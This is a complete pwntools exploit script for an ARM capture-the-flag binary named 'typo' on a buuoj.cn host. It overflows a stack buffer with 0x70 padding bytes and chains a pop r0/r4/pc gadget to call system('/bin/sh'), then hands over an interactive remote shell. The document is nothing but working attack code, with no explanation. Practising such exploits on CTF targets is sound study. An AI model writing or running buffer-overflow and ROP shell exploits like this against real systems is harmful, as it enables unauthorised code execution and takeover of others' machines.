from pwn import *
r = remote('node3.buuoj.cn',28971)
elf = ELF("typo")
system = 0x110b4
binsh = 0x6c384
pop_r0_r4_pc = 0x20904
payload = 'a'*0x70+p32(pop_r0_r4_pc)+p32(binsh)+p32(0)+p32(system)
r.sendline('')
r.sendline(payload)
r.interactive()